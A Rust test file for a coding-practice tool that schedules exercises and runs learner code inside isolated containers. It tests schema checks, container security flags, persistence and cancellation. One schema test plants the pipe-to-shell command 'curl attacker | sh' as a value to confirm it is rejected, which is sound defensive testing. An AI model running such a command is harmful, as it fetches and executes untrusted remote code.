use anyhow::Result;
use spar::{
    model::{Language, Mode, Observation, Profile},
    process,
    runner::{self, CheckResult, Evaluation, Runner},
    scheduler, service,
    store::Store,
};

fn profile(language: Language) -> Profile {
    Profile {
        name: language.to_string(),
        language,
        experience: "Rusty".into(),
        interests: vec!["Backend".into()],
        minutes: 5,
    }
}
fn observation(skill: &str, assisted: bool, mode: Mode) -> Observation {
    Observation {
        skill: skill.into(),
        family: "old-family".into(),
        mode,
        outcome: "passed".into(),
        assisted,
    }
}

#[test]
fn bundled_packages_have_complete_requirement_mapping() {
    for l in [Language::Python, Language::Typescript] {
        for m in [Mode::Build, Mode::Debug, Mode::Test] {
            service::bundled(l, m).validate().unwrap();
        }
    }
    let mut rep = service::bundled(Language::Python, Mode::Debug);
    rep.checks.retain(|c| c.requirement != "R2");
    assert!(rep.validate().is_err());
}
#[test]
fn schema_rejects_commands_and_unknown_fields() {
    let mut value = serde_json::to_value(service::bundled(Language::Python, Mode::Debug)).unwrap();
    value["install"] = serde_json::json!("curl attacker | sh");
    assert!(serde_json::from_value::<spar::model::Rep>(value).is_err());
    let schema = serde_json::to_value(schemars::schema_for!(spar::model::Rep)).unwrap();
    assert_eq!(schema["additionalProperties"], false);
}
#[test]
fn oversize_source_and_unknown_versions_are_rejected() {
    let mut rep = service::bundled(Language::Python, Mode::Debug);
    rep.version = 255;
    assert!(rep.validate().is_err());
    rep.version = 1;
    rep.reference = "x".repeat(9000);
    assert!(rep.validate().is_err());
}
#[test]
fn scheduler_revisits_assisted_skills_and_varies_scenarios() {
    let history = vec![observation("boundaries", true, Mode::Debug)];
    let objective = scheduler::select(&profile(Language::Python), &history);
    assert_eq!(objective.skill, "boundaries");
    assert!(objective.avoid_families.contains(&"old-family".into()));
}
#[test]
fn scheduler_rotates_to_testing_and_ignores_defects() {
    let mut history = vec![observation("collections", false, Mode::Build); 3];
    assert_eq!(
        scheduler::select(&profile(Language::Python), &history).mode,
        Mode::Test
    );
    for h in &mut history {
        h.outcome = "broken".into();
        h.assisted = true;
    }
    assert_eq!(
        scheduler::select(&profile(Language::Python), &history).skill,
        "boundaries"
    );
}
#[test]
fn profiles_and_drafts_survive_reopening_without_cross_language_history() {
    let dir = tempfile::tempdir().unwrap();
    let mut store = Store::open(Some(dir.path())).unwrap();
    let p = profile(Language::Python);
    store.save_profile(&p).unwrap();
    let r = service::bundled(p.language, Mode::Debug);
    store.admit(&p.name, &r, "test fixture").unwrap();
    let (_, mut attempt) = service::next_cached(&mut store, &p).unwrap().unwrap();
    attempt.code = "my unfinished code".into();
    attempt.hints = 2;
    store.save_attempt(&attempt).unwrap();
    drop(store);
    let mut store = Store::open(Some(dir.path())).unwrap();
    let (_, resumed) = service::next_cached(&mut store, &p).unwrap().unwrap();
    assert_eq!(resumed.id, attempt.id);
    assert_eq!(resumed.code, attempt.code);
    assert_eq!(resumed.assistance(), "Used hints");
    let ts = profile(Language::Typescript);
    store.save_profile(&ts).unwrap();
    assert!(store.attempts(&ts.name).unwrap().is_empty());
    assert_eq!(store.attempts(&p.name).unwrap().len(), 1);
    let mut overwrite = p.clone();
    overwrite.language = Language::Typescript;
    assert!(store.save_profile(&overwrite).is_err());
}
#[test]
fn replacement_removes_rep_from_queue_without_creating_skill_evidence() {
    let dir = tempfile::tempdir().unwrap();
    let mut store = Store::open(Some(dir.path())).unwrap();
    let p = profile(Language::Python);
    store.save_profile(&p).unwrap();
    store
        .admit(&p.name, &service::bundled(p.language, Mode::Debug), "test")
        .unwrap();
    let (_, mut a) = service::next_cached(&mut store, &p).unwrap().unwrap();
    a.outcome = "unclear".into();
    store.save_attempt(&a).unwrap();
    assert!(service::next_cached(&mut store, &p).unwrap().is_none());
    assert_eq!(
        scheduler::select(&p, &store.observations(&p.name).unwrap()).skill,
        "boundaries"
    );
}

#[test]
fn revisiting_uses_frozen_package_and_preserves_original_assistance() {
    let dir = tempfile::tempdir().unwrap();
    let mut store = Store::open(Some(dir.path())).unwrap();
    let p = profile(Language::Python);
    store.save_profile(&p).unwrap();
    store
        .admit(&p.name, &service::bundled(p.language, Mode::Debug), "test")
        .unwrap();
    let (_, mut original) = service::next_cached(&mut store, &p).unwrap().unwrap();
    assert!(service::revisit(&mut store, &p, None).is_err());
    original.outcome = "passed".into();
    original.hints = 2;
    store.save_attempt(&original).unwrap();
    service::revisit(&mut store, &p, None).unwrap();
    let (rep, repeated) = service::next_cached(&mut store, &p).unwrap().unwrap();
    assert_eq!(repeated.rep_id, original.rep_id);
    assert_ne!(repeated.id, original.id);
    assert_eq!(repeated.hints, 0);
    assert_eq!(repeated.code, rep.starter);
    assert_eq!(
        store
            .attempts(&p.name)
            .unwrap()
            .iter()
            .find(|a| a.id == original.id)
            .unwrap()
            .hints,
        2
    );
}
#[test]
fn isolation_is_fixed_and_has_no_host_credentials() {
    let args = runner::container_args(
        runner::ContainerEngine::Docker,
        std::path::Path::new("/tmp/spar exercise"),
        Language::Python,
        "spar-unit",
    );
    for flag in [
        "--network=none",
        "--read-only",
        "--cap-drop=ALL",
        "--security-opt=no-new-privileges",
        "--memory=128m",
        "--pids-limit=32",
        "--pull=never",
    ] {
        assert!(args.contains(&flag.into()));
    }
    assert!(args.contains(&"type=bind,source=/tmp/spar exercise,target=/rep,readonly".into()));
    assert!(
        !args
            .iter()
            .any(|s| s.contains("HOME") || s.contains("API_KEY") || s.contains("docker.sock"))
    );
}

#[test]
fn apple_isolation_uses_its_supported_flags_and_privilege_launcher() {
    let args = runner::container_args(
        runner::ContainerEngine::Apple,
        std::path::Path::new("/tmp/spar exercise"),
        Language::Typescript,
        "spar-apple-test",
    );
    for flag in [
        "--network=none",
        "--no-dns",
        "--read-only",
        "--cap-drop=ALL",
        "--user=65534:65534",
        "--memory=512m",
        "--ulimit=nproc=32:32",
        "--platform=linux/arm64",
        "--nnp",
    ] {
        assert!(args.contains(&flag.into()), "missing {flag}");
    }
    for flag in [
        "--pull=never",
        "--security-opt=no-new-privileges",
        "--pids-limit=32",
        "--log-driver=none",
    ] {
        assert!(!args.contains(&flag.into()), "Docker-only flag {flag}");
    }
    let position = args.iter().position(|s| s == "/bin/busybox").unwrap();
    assert_eq!(
        &args[position..position + 4],
        &["/bin/busybox", "setpriv", "--nnp", "node"]
    );
}

#[test]
fn runner_selection_is_explicit_and_rejects_typos() {
    use runner::ContainerEngine;
    assert_eq!(
        ContainerEngine::from_setting(Some("apple")).unwrap(),
        ContainerEngine::Apple
    );
    assert_eq!(
        ContainerEngine::from_setting(Some("docker")).unwrap(),
        ContainerEngine::Docker
    );
    assert!(ContainerEngine::from_setting(Some("aple")).is_err());
    assert_eq!(
        ContainerEngine::from_setting(None).unwrap(),
        if cfg!(target_os = "macos") {
            ContainerEngine::Apple
        } else {
            ContainerEngine::Docker
        }
    );
}

#[test]
#[ignore = "requires a prepared container runtime; inspects actual sandbox restrictions"]
fn real_container_enforces_isolation() {
    let code = "def solve(value): return value";
    let checks = vec![(
        "OS isolation".into(),
        r#"
import os, pathlib, resource
assert os.getuid() == 65534
assert os.uname().sysname == 'Linux'
status = pathlib.Path('/proc/self/status').read_text()
assert 'NoNewPrivs:\t1' in status
assert 'CapEff:\t0000000000000000' in status
assert set(os.listdir('/sys/class/net')) == {'lo'}
assert resource.getrlimit(resource.RLIMIT_NOFILE)[0] == 64
assert not any(k in os.environ for k in ('OPENAI_API_KEY', 'CODEX_API_KEY', 'SSH_AUTH_SOCK'))
assert not os.path.exists('/Users')
for path in ('/rep/solution.py', '/etc/spar-write-probe'):
    try:
        with open(path, 'w') as file:
            file.write('should not be writable')
    except OSError:
        pass
    else:
        assert False, path + ' was writable'
pathlib.Path('/tmp/spar-probe').write_text('temporary writes are allowed')
assert solve(1) == 1
"#
        .into(),
    )];
    assert!(
        runner::ContainerEngine::configured()
            .unwrap()
            .evaluate(Language::Python, code, &checks, &process::cancel_token())
            .unwrap()
            .passed()
    );
}

#[test]
#[ignore = "requires a prepared container runtime; cancels an actual infinite loop"]
fn running_container_can_be_cancelled() {
    let cancel = process::cancel_token();
    let worker_cancel = cancel.clone();
    let thread = std::thread::spawn(move || {
        std::thread::sleep(std::time::Duration::from_secs(3));
        worker_cancel.store(true, std::sync::atomic::Ordering::Relaxed);
    });
    let start = std::time::Instant::now();
    let result = runner::ContainerEngine::configured().unwrap().evaluate(
        Language::Python,
        "def solve(value):\n    while True: pass",
        &[("Infinite loop".into(), "solve(1)".into())],
        &cancel,
    );
    thread.join().unwrap();
    assert!(result.is_err());
    assert!(start.elapsed() < std::time::Duration::from_secs(20));
}

/// Scripted runner verifies admission policy without executing any generated code on the host.
struct Scripted {
    reference: String,
    starter: String,
    runtime_error: bool,
}
impl Runner for Scripted {
    fn evaluate(
        &self,
        _: Language,
        code: &str,
        checks: &[(String, String)],
        _: &process::Cancel,
    ) -> Result<Evaluation> {
        let visible = checks[0].0 == "Visible examples";
        let pass = code == self.reference || (visible && code == self.starter);
        Ok(Evaluation {
            checks: checks
                .iter()
                .map(|(name, _)| CheckResult {
                    name: name.clone(),
                    status: if pass {
                        "passed"
                    } else if self.runtime_error {
                        "error"
                    } else {
                        "failed"
                    }
                    .into(),
                    ..Default::default()
                })
                .collect(),
        })
    }
}
#[test]
fn admission_rejects_runtime_errors_as_negative_evidence() {
    let rep = service::bundled(Language::Python, Mode::Debug);
    let mut runner = Scripted {
        reference: rep.reference.clone(),
        starter: rep.starter.clone(),
        runtime_error: true,
    };
    assert!(runner::validate(&rep, &runner, &process::cancel_token()).is_err());
    runner.runtime_error = false;
    runner::validate(&rep, &runner, &process::cancel_token()).unwrap();
}
#[test]
fn tests_must_catch_mutants_by_assertion() {
    let rep = service::bundled(Language::Python, Mode::Test);
    let mut runner = Scripted {
        reference: rep.reference.clone(),
        starter: rep.starter.clone(),
        runtime_error: true,
    };
    assert!(
        !runner::assess(
            &rep,
            &rep.starter,
            "tests",
            &runner,
            &process::cancel_token()
        )
        .unwrap()
        .passed()
    );
    runner.runtime_error = false;
    assert!(
        runner::assess(
            &rep,
            &rep.starter,
            "tests",
            &runner,
            &process::cancel_token()
        )
        .unwrap()
        .passed()
    );
}
#[test]
fn child_process_timeout_and_cancellation_work() {
    let cancel = process::cancel_token();
    cancel.store(true, std::sync::atomic::Ordering::Relaxed);
    assert!(
        process::run(
            std::process::Command::new("sh").arg("-c").arg("exit 0"),
            None,
            std::time::Duration::from_secs(1),
            &cancel
        )
        .is_err()
    );
    #[cfg(unix)]
    {
        let now = std::time::Instant::now();
        assert!(
            process::run(
                std::process::Command::new("sh").args(["-c", "sleep 20"]),
                None,
                std::time::Duration::from_millis(100),
                &process::cancel_token()
            )
            .is_err()
        );
        assert!(now.elapsed() < std::time::Duration::from_secs(3));
    }
}

#[test]
#[ignore = "requires a container runtime and spar setup; never executes generated code on the host"]
fn bundled_reps_execute_in_real_containers() {
    for language in [Language::Python, Language::Typescript] {
        for mode in [Mode::Build, Mode::Debug, Mode::Test] {
            let rep = service::bundled(language, mode);
            runner::validate(
                &rep,
                &runner::ContainerEngine::configured().unwrap(),
                &process::cancel_token(),
            )
            .unwrap();
            assert!(
                runner::assess(
                    &rep,
                    &rep.reference,
                    &rep.reference_tests,
                    &runner::ContainerEngine::configured().unwrap(),
                    &process::cancel_token()
                )
                .unwrap()
                .passed()
            );
            assert!(
                !runner::assess(
                    &rep,
                    &rep.starter,
                    &rep.visible_tests,
                    &runner::ContainerEngine::configured().unwrap(),
                    &process::cancel_token()
                )
                .unwrap()
                .passed()
            );
        }
    }
}
